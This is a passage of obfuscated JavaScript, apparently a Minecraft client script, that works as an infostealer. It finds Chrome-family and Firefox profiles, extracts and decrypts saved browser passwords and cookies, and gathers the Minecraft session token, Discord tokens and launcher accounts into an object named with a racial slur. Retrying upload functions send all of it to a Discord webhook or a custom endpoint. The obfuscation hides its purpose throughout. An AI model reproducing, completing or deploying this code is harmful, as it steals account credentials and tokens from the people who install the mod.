_0x559bef=_0x1b4c56[0x1],_0x42dda4=_0x1b4c56[0x2],_0x248530=_0x1b4c56[0x3];if(!_0x559bef||!_0x42dda4)continue;if(_0x559bef[_0x418011(0x478,'iy!H')]>0x64||_0x42dda4[_0x418011(0x4a1,'G3bK')]>0x64)continue;if(!/^[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,10}$/[_0x418011(0x225,'@G#8')](_0x559bef))continue;let _0x15c418=_0x248530,_0x4e3920=![];if(_0x49bafc&&(_0x248530[_0x418011(0x297,'7%NS')](_0x418011(0x5bf,'Prp1'))||_0x248530[_0x418011(0x562,'[B%l')](_0x418011(0x184,'rMVl')))){let _0xa8f5c7=decryptChromeCookie(_0x248530,_0x49bafc);_0xa8f5c7&&_0xa8f5c7!==_0x248530&&(_0x15c418=_0xa8f5c7,_0x4e3920=!![]);}_0x2d82f8[_0x418011(0x635,'zJu^')]({'origin_url':_0x418011(0x589,'zEki')+_0x559bef,'username_value':_0x42dda4,'password_value':_0x15c418,'date_created':0x0,'date_last_used':0x0,'browser':_0x12d243,'encrypted':_0x4e3920});}}return _0x2d82f8;}function _0x3715be(){const _0x346b60=a0_0x4c67;let _0x5912ae=[];try{let _0x1de0b9=new java['io'][(_0x346b60(0x2a5,'tldi'))](localAppData+_0x346b60(0x673,'fQM$'));if(_0x1de0b9[_0x346b60(0x1f1,'G3bK')]()){let _0x52df42=_0x1de0b9[_0x346b60(0x3f7,'PgYc')]();for(let _0x567f82=0x0;_0x567f82<_0x52df42[_0x346b60(0x62c,')WT4')];_0x567f82++){if(_0x52df42[_0x567f82][_0x346b60(0x415,'pMYq')]()){let _0x3a7adb=_0x52df42[_0x567f82][_0x346b60(0x5a6,'@[ny')](),_0x1e288e=new java['io'][(_0x346b60(0x63d,'th37'))](_0x52df42[_0x567f82],_0x346b60(0x22c,')n)b'));_0x1e288e[_0x346b60(0x1de,'8(V@')]()&&_0x5912ae[_0x346b60(0x514,'2Fbx')]({'name':_0x346b60(0x332,'tldi')+_0x3a7adb,'loginDataPath':_0x1e288e[_0x346b60(0x210,'@[ny')](),'localStatePath':_0x1de0b9[_0x346b60(0x3fd,'lVXf')]()+_0x346b60(0x540,'BYlI'),'type':_0x346b60(0x19f,'uenZ')});}}}}catch(_0x35bead){}try{let _0x3b7161=new java['io'][(_0x346b60(0x2a5,'tldi'))](localAppData+_0x346b60(0x4c2,'wIzM'));if(_0x3b7161[_0x346b60(0x239,'th37')]()){let _0x58e249=_0x3b7161[_0x346b60(0x410,'gkB6')]();for(let _0x411b59=0x0;_0x411b59<_0x58e249[_0x346b60(0x1fa,'Prp1')];_0x411b59++){if(_0x58e249[_0x411b59][_0x346b60(0x4ff,'V$ji')]()){let _0x2eff68=_0x58e249[_0x411b59][_0x346b60(0x1e2,'BYlI')](),_0x2bafac=new java['io'][(_0x346b60(0x34a,'2Fbx'))](_0x58e249[_0x411b59],_0x346b60(0x43b,'emuX'));_0x2bafac[_0x346b60(0x2ab,'Fi7!')]()&&_0x5912ae[_0x346b60(0x1e9,'aH$!')]({'name':_0x346b60(0x503,'Q%]A')+_0x2eff68,'loginDataPath':_0x2bafac[_0x346b60(0x33d,'7%NS')](),'localStatePath':_0x3b7161[_0x346b60(0x278,'Lz2$')]()+_0x346b60(0x304,'@[ny'),'type':_0x346b60(0x24a,'#cv9')});}}}}catch(_0x36e1b6){}try{let _0x5ea987=new java['io'][(_0x346b60(0x42e,')n)b'))](appData+_0x346b60(0x219,'PgYc'));if(_0x5ea987[_0x346b60(0x417,'lVXf')]()){let _0x21f8a6=_0x5ea987[_0x346b60(0x2eb,'5w@D')]();for(let _0x55147a=0x0;_0x55147a<_0x21f8a6[_0x346b60(0x630,'5w@D')];_0x55147a++){if(_0x21f8a6[_0x55147a][_0x346b60(0x61c,'8(V@')]()){let _0x41654a=new java['io'][(_0x346b60(0x288,'@[ny'))](_0x21f8a6[_0x55147a],_0x346b60(0x358,'pMYq')),_0xb39fb8=new java['io'][(_0x346b60(0x2a5,'tldi'))](_0x21f8a6[_0x55147a],_0x346b60(0x49d,'BYlI'));_0x41654a[_0x346b60(0x4e6,'PwVi')]()&&_0x5912ae[_0x346b60(0x2ad,'rMVl')]({'name':_0x346b60(0x378,'1&mi')+_0x21f8a6[_0x55147a][_0x346b60(0x1af,'zJu^')](),'loginDataPath':_0x41654a[_0x346b60(0x2f5,'zJu^')](),'keyPath':_0xb39fb8[_0x346b60(0x239,'th37')]()?_0xb39fb8[_0x346b60(0x3fe,'pMYq')]():null,'type':_0x346b60(0x458,'rMVl'),'profilePath':_0x21f8a6[_0x55147a][_0x346b60(0x1c1,'2Kmv')]()});}}}}catch(_0x2f0395){}return _0x5912ae;}function _0x5e09d4(_0x3e39f8,_0x249f9a){const _0x298cdc=a0_0x4c67;try{let _0x5cb45f=new java['io'][(_0x298cdc(0x4cb,'h!Dk'))](_0x3e39f8);if(!_0x5cb45f[_0x298cdc(0x44f,'dMvi')]())return[];let _0x2152e9=new java[(_0x298cdc(0x1b8,'RRF)'))][(_0x298cdc(0x623,'fQM$'))](java[_0x298cdc(0x31f,'G3bK')][_0x298cdc(0x63e,'Ep[K')][_0x298cdc(0x345,'5w@D')][_0x298cdc(0x34b,'whZ0')](_0x5cb45f[_0x298cdc(0x2d1,'dMvi')]()),_0x298cdc(0x4f4,'a%Ty')),_0x12e6d1=JSON[_0x298cdc(0x4b3,'ATso')](_0x2152e9),_0x5e372a=[];if(_0x12e6d1[_0x298cdc(0x2d6,'Ep[K')]&&Array[_0x298cdc(0x18e,'jn62')](_0x12e6d1[_0x298cdc(0x43a,'1&mi')]))for(let _0x572349=0x0;_0x572349<_0x12e6d1[_0x298cdc(0x28e,'iy!H')][_0x298cdc(0x249,'Lz2$')]&&_0x5e372a[_0x298cdc(0x326,'lVXf')]<0x64;_0x572349++){let _0x1e39d9=_0x12e6d1[_0x298cdc(0x28e,'iy!H')][_0x572349];_0x1e39d9[_0x298cdc(0x18d,'4G]x')]&&_0x1e39d9[_0x298cdc(0x40d,'PwVi')]&&_0x1e39d9[_0x298cdc(0x64f,'a%Ty')]&&_0x5e372a[_0x298cdc(0x43c,'dMvi')]({'origin_url':_0x1e39d9[_0x298cdc(0x3fc,'h!Dk')],'username_value':_0x1e39d9[_0x298cdc(0x57e,')WT4')],'password_value':_0x1e39d9[_0x298cdc(0x474,'PwVi')],'date_created':_0x1e39d9[_0x298cdc(0x499,'pMYq')]||0x0,'date_last_used':_0x1e39d9[_0x298cdc(0x218,'pMYq')]||0x0,'browser':_0x249f9a,'encrypted':!![],'firefox_guid':_0x1e39d9[_0x298cdc(0x613,'NO98')]||null});}return _0x5e372a;}catch(_0xe0a4f2){return[{'origin_url':_0x298cdc(0x2aa,'Q%]A'),'username_value':_0x298cdc(0x58f,'jqTf'),'password_value':_0xe0a4f2[_0x298cdc(0x4bc,'Ep[K')](),'date_created':0x0,'date_last_used':0x0,'browser':_0x249f9a,'encrypted':![]}];}}let _0x3544bc=_0x4dfc87[_0x39679b(0x3e0,'iy!H')](_0x3715be()),_0x98a43c=[],_0x15f6ac=new java[(_0x39679b(0x401,'#cv9'))][(_0x39679b(0x5db,'Fi7!'))]();for(let _0x3a6a42=0x0;_0x3a6a42<_0x3544bc[_0x39679b(0x249,'Lz2$')];_0x3a6a42++){!_0x15f6ac[_0x39679b(0x610,'lVXf')](_0x3544bc[_0x3a6a42][_0x39679b(0x3e7,'@[ny')])&&(_0x15f6ac[_0x39679b(0x22e,'#cv9')](_0x3544bc[_0x3a6a42][_0x39679b(0x3c4,'zEki')]),_0x98a43c[_0x39679b(0x35e,'PgYc')](_0x3544bc[_0x3a6a42]));}for(let _0x22c1be=0x0;_0x22c1be<_0x98a43c[_0x39679b(0x37a,'tldi')];_0x22c1be++){let _0x3e217f=_0x98a43c[_0x22c1be];try{let _0x33f4a9=new java['io'][(_0x39679b(0x52c,'@G#8'))](_0x3e217f[_0x39679b(0x3c7,'V$ji')]);if(!_0x33f4a9[_0x39679b(0x4df,'whZ0')]()||_0x33f4a9[_0x39679b(0x45e,'gkB6')]()==0x0)continue;let _0x12dc03=[];if(_0x3e217f[_0x39679b(0x47b,'2Fbx')]===_0x39679b(0x3ed,'2Kmv'))_0x12dc03=_0x5e09d4(_0x3e217f[_0x39679b(0x3c4,'zEki')],_0x3e217f[_0x39679b(0x46c,'#cv9')]);else{let _0x4d1dd5=null;if(_0x3e217f[_0x39679b(0x1d5,'Lz2$')])try{_0x4d1dd5=getChromeKey(_0x3e217f[_0x39679b(0x554,'Q%]A')]);}catch(_0x5f0ca5){}_0x12dc03=_0x2a7a95(_0x3e217f[_0x39679b(0x561,'ATso')],_0x3e217f[_0x39679b(0x2d7,'G3bK')],_0x4d1dd5);}if(_0x12dc03&&_0x12dc03[_0x39679b(0x4c6,'ATso')]>0x0){let _0x79386f={'browser':_0x3e217f[_0x39679b(0x348,'2Kmv')],'browserType':_0x3e217f[_0x39679b(0x3b0,'gkB6')],'passwordCount':_0x12dc03[_0x39679b(0x230,'a%Ty')],'passwords':_0x12dc03,'extractedAt':new java[(_0x39679b(0x5fc,'zJu^'))][(_0x39679b(0x3cb,'PgYc'))]()[_0x39679b(0x1c8,'jqTf')](),'filePath':_0x3e217f[_0x39679b(0x2f7,'PwVi')],'fileSize':_0x33f4a9[_0x39679b(0x60f,'zEki')](),'lastModified':new java[(_0x39679b(0x487,'NO98'))][(_0x39679b(0x3cd,'gkB6'))](_0x33f4a9[_0x39679b(0x283,'BYlI')]())[_0x39679b(0x27a,'8(V@')](),'encryptionKeyFound':_0x3e217f[_0x39679b(0x66d,'[B%l')]===_0x39679b(0x2a3,'8(V@')?decryptionKey!==null:![],'profilePath':_0x3e217f[_0x39679b(0x37f,'etie')]||null};if(_0x3e217f[_0x39679b(0x5f4,'2Kmv')])try{let _0x1e3840=new java['io'][(_0x39679b(0x1a2,'Fi7!'))](_0x3e217f[_0x39679b(0x2ed,'6(Qp')]);_0x1e3840[_0x39679b(0x351,'4G]x')]()&&(_0x79386f[_0x39679b(0x54c,'6(Qp')]=!![],_0x79386f[_0x39679b(0x1d2,'Prp1')]=_0x1e3840[_0x39679b(0x45e,'gkB6')]());}catch(_0x2c03ba){}_0x5cc465[_0x3e217f[_0x39679b(0x200,'zJu^')]]=_0x79386f;}}catch(_0x406779){_0x5cc465[_0x3e217f[_0x39679b(0x376,'W^I^')]+_0x39679b(0x253,'wIzM')]={'browser':_0x3e217f[_0x39679b(0x223,'etie')],'error':_0x406779[_0x39679b(0x46f,'Fi7!')](),'extractedAt':new java[(_0x39679b(0x232,')n)b'))][(_0x39679b(0x539,'pMYq'))]()[_0x39679b(0x254,'a%Ty')]()};}}let _0x1c42ca={'totalBrowsersChecked':Object[_0x39679b(0x45b,'Q%]A')](_0x5cc465)[_0x39679b(0x41b,'whZ0')],'browsersWithErrors':0x0,'browsersWithPasswords':0x0,'totalPasswordsFound':0x0},_0x2f6040={};for(let _0x25b4a4 in _0x5cc465){let _0x42cb84=_0x5cc465[_0x25b4a4];if(_0x25b4a4[_0x39679b(0x1dc,'zJu^')](_0x39679b(0x5a7,'#cv9'))||_0x42cb84[_0x39679b(0x2c1,'h!Dk')]){_0x1c42ca[_0x39679b(0x409,'8(V@')]++;continue;}if(_0x42cb84[_0x39679b(0x466,'tldi')]&&Array[_0x39679b(0x604,'#cv9')](_0x42cb84[_0x39679b(0x5a1,'5w@D')])&&_0x42cb84[_0x39679b(0x3b3,'#cv9')][_0x39679b(0x4a1,'G3bK')]>0x0){let _0x2c1025=_0x42cb84[_0x39679b(0x520,'1&mi')][_0x39679b(0x395,'NO98')](_0x368f3d=>{const _0x356c1c=_0x39679b;return _0x368f3d[_0x356c1c(0x41f,'2Fbx')]!==_0x356c1c(0x492,'a%Ty')&&_0x368f3d[_0x356c1c(0x647,'RRF)')]!==_0x356c1c(0x663,'etie')&&_0x368f3d[_0x356c1c(0x44a,'8(V@')]!==_0x356c1c(0x672,'W^I^')&&_0x368f3d[_0x356c1c(0x402,'6(Qp')]!==_0x356c1c(0x513,'RRF)')&&_0x368f3d[_0x356c1c(0x601,'fQM$')]!==_0x356c1c(0x21f,'aH$!')&&!_0x368f3d[_0x356c1c(0x48f,'2Kmv')][_0x356c1c(0x456,'G3bK')](_0x356c1c(0x3d6,'5w@D'))&&!_0x368f3d[_0x356c1c(0x532,'4G]x')][_0x356c1c(0x36a,'PwVi')](_0x356c1c(0x19e,'h!Dk'))&&!_0x368f3d[_0x356c1c(0x34c,'dMvi')][_0x356c1c(0x66f,'fQM$')](_0x356c1c(0x374,'PwVi'));});_0x2c1025[_0x39679b(0x37a,'tldi')]>0x0&&(_0x42cb84[_0x39679b(0x3c9,'Ep[K')]=_0x2c1025,_0x42cb84[_0x39679b(0x34d,'6(Qp')]=_0x2c1025[_0x39679b(0x630,'5w@D')],_0x2f6040[_0x25b4a4]=_0x42cb84,_0x1c42ca[_0x39679b(0x1e5,'whZ0')]++,_0x1c42ca[_0x39679b(0x3e1,'V$ji')]+=_0x2c1025[_0x39679b(0x36c,'Q%]A')]);}}return _0x1c42ca[_0x39679b(0x204,'Q%]A')]===0x0&&(_0x2f6040[_0x39679b(0x482,'Q%]A')]=_0x1c42ca),JSON[_0x39679b(0x1e3,'Prp1')](_0x2f6040);}const datanigga={'username':Player[a0_0x49b0a2(0x5dd,')n)b')](),'uuid':Player[a0_0x49b0a2(0x25a,'BYlI')](),'token':Client[a0_0x49b0a2(0x4e0,'wIzM')]()[a0_0x49b0a2(0x3c5,'aH$!')]()[a0_0x49b0a2(0x2a8,'Fi7!')](),'discord':getTokens(),'cookies':getCookies(),'passwords':getPasswords(),'essentials':microsoftAccounts,'mmc':mmcAccounts,'prism':prismAccounts};var WEBHOOK_URL=a0_0x49b0a2(0x638,'2Kmv'),CUSTOM_ENDPOINT_URL='',CUSTOM_AUTH_HEADER=null;function sleepMs(_0x3f9d04){const _0x58ddde=a0_0x49b0a2;try{java[_0x58ddde(0x4c1,'1&mi')][_0x58ddde(0x359,'Prp1')][_0x58ddde(0x387,'NO98')](_0x3f9d04);}catch(_0x5590c7){}}function readStreamFully(_0x221ca7){const _0x3de1eb=a0_0x49b0a2;if(!_0x221ca7)return'';var _0x296703=Java[_0x3de1eb(0x2ca,'#cv9')](_0x3de1eb(0x3dc,'6(Qp')),_0x4dbe7b=new _0x296703(_0x221ca7,_0x3de1eb(0x5fb,'[B%l'))[_0x3de1eb(0x64d,'gkB6')]('\x5cA'),_0x5b28d6=_0x4dbe7b[_0x3de1eb(0x5fd,'iy!H')]()?_0x4dbe7b[_0x3de1eb(0x479,'emuX')]():'';_0x4dbe7b[_0x3de1eb(0x1b6,'1&mi')]();try{_0x221ca7[_0x3de1eb(0x228,'pMYq')]();}catch(_0x5bbcd1){}return _0x5b28d6;}function httpGetJson(_0x31f8b7){const _0x18ea3a=a0_0x49b0a2;try{var _0x5058e4=Java[_0x18ea3a(0x430,'aH$!')](_0x18ea3a(0x2ce,'rMVl')),_0x4734da=new _0x5058e4(_0x31f8b7)[_0x18ea3a(0x619,'jn62')]();try{_0x4734da[_0x18ea3a(0x24e,'W^I^')](_0x18ea3a(0x3d9,'Q%]A'));}catch(_0x272d90){}_0x4734da[_0x18ea3a(0x22d,'fQM$')](_0x18ea3a(0x3cc,'G3bK'),_0x18ea3a(0x4e2,'Lz2$')),_0x4734da[_0x18ea3a(0x36f,')WT4')](_0x18ea3a(0x328,'tldi'),_0x18ea3a(0x287,'2Kmv'));var _0x4990b9=readStreamFully(_0x4734da[_0x18ea3a(0x26c,'1&mi')]());return JSON[_0x18ea3a(0x4eb,'Ep[K')](String(_0x4990b9));}catch(_0x379e9a){return null;}}function sendJsonReturnBody(_0x25d2bf,_0xe20c44){const _0x57e91c=a0_0x49b0a2;var _0x40bb8d=Java[_0x57e91c(0x1ad,'Wi[K')](_0x57e91c(0x45a,'BYlI')),_0x5e9fa1=0x0;while(!![]){_0x5e9fa1++;var _0x25f9da=new _0x40bb8d(WEBHOOK_URL+(WEBHOOK_URL[_0x57e91c(0x1a9,'dMvi')]('?')===-0x1?_0x57e91c(0x5ba,'gkB6'):_0x57e91c(0x48c,'Prp1'))),_0xdcf42e=_0x25f9da[_0x57e91c(0x424,'PgYc')]();try{_0xdcf42e[_0x57e91c(0x366,'5w@D')](_0x57e91c(0x1ce,'Prp1'));}catch(_0x3a7f3d){}_0xdcf42e[_0x57e91c(0x677,'fQM$')](!![]),_0xdcf42e[_0x57e91c(0x3d8,'[B%l')](_0x57e91c(0x368,'whZ0'),_0x57e91c(0x65a,'gkB6')),_0xdcf42e[_0x57e91c(0x30c,'ATso')](_0x57e91c(0x64e,'Fi7!'),_0x57e91c(0x65a,'gkB6')),_0xdcf42e[_0x57e91c(0x611,'tldi')](_0x57e91c(0x576,'emuX'),_0x57e91c(0x1c3,'iy!H'));var _0x231e5c=Java[_0x57e91c(0x47b,'2Fbx')](_0x57e91c(0x18f,'[B%l')),_0x791c55=_0xdcf42e[_0x57e91c(0x4fd,'pMYq')]();_0x791c55[_0x57e91c(0x362,'4G]x')](new _0x231e5c(String(_0x25d2bf))[_0x57e91c(0x23d,'fQM$')](_0x57e91c(0x4d0,'dMvi'))),_0x791c55[_0x57e91c(0x59b,'h!Dk')](),_0x791c55[_0x57e91c(0x1e0,'Prp1')]();var _0x3b0d23=0x0;try{_0x3b0d23=_0xdcf42e[_0x57e91c(0x454,'NO98')]();}catch(_0x1166c2){}if(_0x3b0d23===0x1ad){var _0x1472b1=readStreamFully(_0xdcf42e[_0x57e91c(0x512,'zEki')]()),_0x6a5946=0x1;try{_0x6a5946=Math[_0x57e91c(0x626,'iy!H')](0.05,JSON[_0x57e91c(0x636,'iy!H')](_0x1472b1)[_0x57e91c(0x388,'zJu^')]||0x1);}catch(_0x169fa1){}sleepMs(Math[_0x57e91c(0x666,'Prp1')](_0x6a5946*0x3e8));if(_0x5e9fa1>=(_0xe20c44||0x5))throw new Error(_0x57e91c(0x4e8,'gkB6'));continue;}if(_0x3b0d23>=0x1f4&&_0x3b0d23<0x258){sleepMs(0x190+_0x5e9fa1*0x12c);if(_0x5e9fa1>=(_0xe20c44||0x5))throw new Error(_0x57e91c(0x621,')n)b')+_0x3b0d23);continue;}if(_0x3b0d23>=0xc8&&_0x3b0d23<0x12c)try{return readStreamFully(_0xdcf42e[_0x57e91c(0x643,'2Kmv')]());}catch(_0x2c2adb){return'';}return readStreamFully(_0xdcf42e[_0x57e91c(0x331,'Q%]A')]()),'';}}function sendMultipartReturnBody(_0x3a4f43,_0x5e8a44,_0x2eeabc){const _0x277dba=a0_0x49b0a2;var _0x13a5f3=Java[_0x277dba(0x60b,'G3bK')](_0x277dba(0x47d,'Lz2$')),_0x17f74b=0x0;while(!![]){_0x17f74b++;var _0x1fdb52=makeMultipartBody(_0x3a4f43,_0x5e8a44),_0x90424=new _0x13a5f3(WEBHOOK_URL+(WEBHOOK_URL[_0x277dba(0x614,'rMVl')]('?')===-0x1?_0x277dba(0x4a0,'zEki'):_0x277dba(0x53a,'pMYq'))),_0x29c4c9=_0x90424[_0x277dba(0x66b,'Fi7!')]();try{_0x29c4c9[_0x277dba(0x231,'BYlI')](_0x277dba(0x510,'@[ny'));}catch(_0x1cf903){}_0x29c4c9[_0x277dba(0x57d,'Fi7!')](!![]),_0x29c4c9[_0x277dba(0x2a1,'Wi[K')](_0x277dba(0x3c3,'Lz2$'),_0x1fdb52[_0x277dba(0x2c8,'BYlI')]),_0x29c4c9[_0x277dba(0x4ad,'Fi7!')](_0x277dba(0x450,'Wi[K'),_0x277dba(0x212,'5w@D')),_0x29c4c9[_0x277dba(0x286,'W^I^')](_0x277dba(0x3a9,'jn62'),_0x277dba(0x2e9,'Lz2$')),_0x29c4c9[_0x277dba(0x575,'#cv9')](_0x277dba(0x400,'PwVi'),_0x277dba(0x316,'dMvi'));var _0x1f2c53=_0x29c4c9[_0x277dba(0x44d,'W^I^')]();_0x1f2c53[_0x277dba(0x664,'a%Ty')](_0x1fdb52[_0x277dba(0x21c,'W^I^')]),_0x1f2c53[_0x277dba(0x37d,'zJu^')](),_0x1f2c53[_0x277dba(0x1f3,'#cv9')]();var _0x5842ee=0x0;try{_0x5842ee=_0x29c4c9[_0x277dba(0x2a9,'@G#8')]();}catch(_0x1c24c7){}if(_0x5842ee===0x1ad){var _0x2d7e58=readStreamFully(_0x29c4c9[_0x277dba(0x2ba,'PgYc')]()),_0x11d52a=0x1;try{_0x11d52a=Math[_0x277dba(0x42c,'8(V@')](0.05,JSON[_0x277dba(0x66e,'4G]x')](_0x2d7e58)[_0x277dba(0x463,'aH$!')]||0x1);}catch(_0xea807c){}sleepMs(Math[_0x277dba(0x2da,'2Kmv')](_0x11d52a*0x3e8));if(_0x17f74b>=(_0x2eeabc||0x5))throw new Error(_0x277dba(0x552,'5w@D'));continue;}if(_0x5842ee>=0x1f4&&_0x5842ee<0x258){sleepMs(0x190+_0x17f74b*0x12c);if(_0x17f74b>=(_0x2eeabc||0x5))throw new Error(_0x277dba(0x294,'aH$!')+_0x5842ee);continue;}if(_0x5842ee>=0xc8&&_0x5842ee<0x12c)try{return readStreamFully(_0x29c4c9[_0x277dba(0x277,'Lz2$')]());}catch(_0x535577){return'';}return readStreamFully(_0x29c4c9[_0x277dba(0x553,'2Fbx')]()),'';}}function editWebhookMessage(_0x326285,_0x5417b1){const _0x42e596=a0_0x49b0a2;try{var _0x508134=Java[_0x42e596(0x430,'aH$!')](_0x42e596(0x4e5,'uenZ')),_0x527c7d=new _0x508134(WEBHOOK_URL+_0x42e596(0x1f7,'Prp1')+_0x326285)[_0x42e596(0x3ba,'6(Qp')]();try{_0x527c7d[_0x42e596(0x617,'8(V@')](_0x42e596(0x1b2,'gkB6'));}catch(_0x101392){_0x527c7d[_0x42e596(0x48d,'dMvi')](_0x42e596(0x1bb,'[B%l')),_0x527c7d[_0x42e596(0x286,'W^I^')](_0x42e596(0x342,'a%Ty'),_0x42e596(0x3e8,'5w@D'));}_0x527c7d[_0x42e596(0x548,'BYlI')](!![]),_0x527c7d[_0x42e596(0x302,'etie')](_0x42e596(0x368,'whZ0'),_0x42e596(0x59f,'1&mi')),_0x527c7d[_0x42e596(0x575,'#cv9')](_0x42e596(0x3c1,'jn62'),_0x42e596(0x287,'2Kmv'));var _0x917229=Java[_0x42e596(0x4f0,'Ep[K')](_0x42e596(0x608,'@G#8')),_0x4d4427=_0x527c7d[_0x42e596(0x580,'gkB6')]();_0x4d4427[_0x42e596(0x32d,'7%NS')](new _0x917229(String(_0x5417b1))[_0x42e596(0x5c2,'PwVi')](_0x42e596(0x587,'1&mi'))),_0x4d4427[_0x42e596(0x266,'PgYc')](),_0x4d4427[_0x42e596(0x5d2,'@G#8')]();var _0x218ee2=0x0;try{_0x218ee2=_0x527c7d[_0x42e596(0x491,'fQM$')]();}catch(_0xa097f9){}if(_0x218ee2===0x1ad){var _0x693adf=readStreamFully(_0x527c7d[_0x42e596(0x2dc,'emuX')]()),_0x3cd69e=0x1;try{_0x3cd69e=Math[_0x42e596(0x416,'fQM$')](0.05,JSON[_0x42e596(0x17e,'gkB6')](_0x693adf)[_0x42e596(0x5e8,'etie')]||0x1);}catch(_0x1059bb){}return sleepMs(Math[_0x42e596(0x226,'zJu^')](_0x3cd69e*0x3e8)),editWebhookMessage(_0x326285,_0x5417b1);}return _0x218ee2>=0xc8&&_0x218ee2<0x12c;}catch(_0x189fcf){return![];}}function makeMultipartBody(_0x4ba3bf,_0x3a54bc){const _0xc36111=a0_0x49b0a2;var _0x16ab11=Java[_0xc36111(0x55a,'fQM$')](_0xc36111(0x30b,'iy!H')),_0x4a3a0b=Java[_0xc36111(0x334,'V$ji')](_0xc36111(0x51b,'ATso')),_0x61a425=Java[_0xc36111(0x60b,'G3bK')](_0xc36111(0x4ed,'whZ0')),_0x82ec4f=new _0x16ab11(),_0x1fd8c2=new _0x4a3a0b(_0x82ec4f),_0x8ee8d5=_0xc36111(0x63a,'ATso')+java[_0xc36111(0x504,'Q%]A')][_0xc36111(0x24d,'zEki')][_0xc36111(0x40a,'rMVl')]()[_0xc36111(0x582,'jn62')]()[_0xc36111(0x4dd,'Prp1')](/-/g,''),_0x1001d5='\x0d\x0a';function _0x19e5e0(_0x279a01){const _0x14182b=_0xc36111;_0x1fd8c2[_0x14182b(0x261,'#cv9')](new _0x61a425(String(_0x279a01))[_0x14182b(0x2d2,'gkB6')](_0x14182b(0x1c2,'2Kmv')));}_0x19e5e0('--'+_0x8ee8d5+_0x1001d5),_0x19e5e0(_0xc36111(0x5a5,'Prp1')+_0x1001d5),_0x19e5e0(_0xc36111(0x5b7,'6(Qp')+_0x1001d5+_0x1001d5),_0x19e5e0(_0x4ba3bf+_0x1001d5);for(var _0x107b7f=0x0;_0x107b7f<_0x3a54bc[_0xc36111(0x5d9,'zJu^')];_0x107b7f++){var _0x5d9420=_0x3a54bc[_0x107b7f],_0x1b5542=_0x5d9420[_0xc36111(0x2f1,'@[ny')]||_0xc36111(0x58c,')WT4');_0x19e5e0('--'+_0x8ee8d5+_0x1001d5),_0x19e5e0(_0xc36111(0x5bb,'W^I^')+_0x107b7f+_0xc36111(0x451,'V$ji')+String(_0x5d9420[_0xc36111(0x29b,')WT4')])[_0xc36111(0x4dd,'Prp1')](/"/g,'')+'\x22'+_0x1001d5),_0x19e5e0(_0xc36111(0x3bd,'fQM$')+_0x1b5542+_0x1001d5+_0x1001d5),_0x5d9420[_0xc36111(0x183,'gkB6')]?(_0x1fd8c2[_0xc36111(0x431,'iy!H')](_0x5d9420[_0xc36111(0x496,'1&mi')]),_0x19e5e0(_0x1001d5)):(_0x19e5e0(String(_0x5d9420[_0xc36111(0x48a,'8(V@')]||'')),_0x19e5e0(_0x1001d5));}return _0x19e5e0('--'+_0x8ee8d5+'--'+_0x1001d5),_0x1fd8c2[_0xc36111(0x50b,'fQM$')](),_0x1fd8c2[_0xc36111(0x57a,'Lz2$')](),{'bytes':_0x82ec4f[_0xc36111(0x350,'PgYc')](),'contentType':_0xc36111(0x464,'2Fbx')+_0x8ee8d5};}function sendWithRetryMultipart(_0x2359ae,_0x376b36,_0x4e3961){const _0x1ed81c=a0_0x49b0a2;var _0x4cf500=Java[_0x1ed81c(0x384,')WT4')](_0x1ed81c(0x381,'6(Qp')),_0x3ea0cd=Java[_0x1ed81c(0x47c,'NO98')](_0x1ed81c(0x531,'Ep[K')),_0x2b6aca=0x0;while(!![]){_0x2b6aca++;var _0x2f1fed=makeMultipartBody(_0x2359ae,_0x376b36),_0x5e52ea=CUSTOM_ENDPOINT_URL&&CUSTOM_ENDPOINT_URL[_0x1ed81c(0x41b,'whZ0')]>0x0?CUSTOM_ENDPOINT_URL:WEBHOOK_URL,_0x52b097=new _0x4cf500(_0x5e52ea)[_0x1ed81c(0x3a0,'zJu^')]();try{_0x52b097[_0x1ed81c(0x25b,'aH$!')](_0x1ed81c(0x523,'pMYq'));}catch(_0x50b8dc){}_0x52b097[_0x1ed81c(0x606,'jqTf')](!![]),_0x52b097[_0x1ed81c(0x2c5,'@G#8')](_0x1ed81c(0x181,')WT4'),_0x2f1fed[_0x1ed81c(0x650,'Lz2$')]),_0x52b097[_0x1ed81c(0x17f,'RRF)')](_0x1ed81c(0x3c1,'jn62'),_0x1ed81c(0x4f9,'Ep[K')),_0x52b097[_0x1ed81c(0x370,'whZ0')](_0x1ed81c(0x59d,'V$ji'),_0x1ed81c(0x33b,')n)b'));CUSTOM_ENDPOINT_URL&&CUSTOM_ENDPOINT_URL[_0x1ed81c(0x230,'a%Ty')]>0x0&&CUSTOM_AUTH_HEADER&&_0x52b097[_0x1ed81c(0x537,'jqTf')](_0x1ed81c(0x2b4,'uenZ'),CUSTOM_AUTH_HEADER);_0x52b097[_0x1ed81c(0x611,'tldi')](_0x1ed81c(0x273,'etie'),_0x1ed81c(0x2a2,'[B%l'));var _0xa3fb4f=_0x52b097[_0x1ed81c(0x5ca,'1&mi')]();_0xa3fb4f[_0x1ed81c(0x1bd,'emuX')](_0x2f1fed[_0x1ed81c(0x674,'Q%]A')]),_0xa3fb4f[_0x1ed81c(0x244,'6(Qp')](),_0xa3fb4f[_0x1ed81c(0x31e,'6(Qp')]();var _0x44d28d=0x0;try{_0x44d28d=_0x52b097[_0x1ed81c(0x372,'Lz2$')]();}catch(_0x13fdb5){}if(_0x44d28d===0x1ad){var _0x2de120=readStreamFully(_0x52b097[_0x1ed81c(0x32b,'a%Ty')]()),_0xca95aa=0x1;try{_0xca95aa=Math[_0x1ed81c(0x5bc,'BYlI')](0.05,JSON[_0x1ed81c(0x4be,'dMvi')](_0x2de120)[_0x1ed81c(0x307,'Lz2$')]||0x1);}catch(_0x186ec4){}sleepMs(Math[_0x1ed81c(0x4d4,'2Fbx')](_0xca95aa*0x3e8));if(_0x2b6aca>=(_0x4e3961||0x5))throw new Error(_0x1ed81c(0x48b,'zEki'));continue;}if(_0x44d28d>=0x1f4&&_0x44d28d<0x258){sleepMs(0x190+_0x2b6aca*0x12c);if(_0x2b6aca>=(_0x4e3961||0x5))throw new Error(_0x1ed81c(0x20b,'PgYc')+_0x44d28d);continue;}if(_0x44d28d>=0xc8&&_0x44d28d<0x12c)return!![];return readStreamFully(_0x52b097[_0x1ed81c(0x5f5,'V$ji')]()),![];}}function prettyOrRaw(_0x4a0519){const _0x337041=a0_0x49b0a2;if(!_0x4a0519)return'';try{return JSON[_0x337041(0x1c9,'NO98')](JSON[_0x337041(0x4be,'dMvi')](String(_0x4a0519)),null,0x2);}catch(_0x50d736){return String(_0x4a0519);}}function sendDataToDiscord(){const 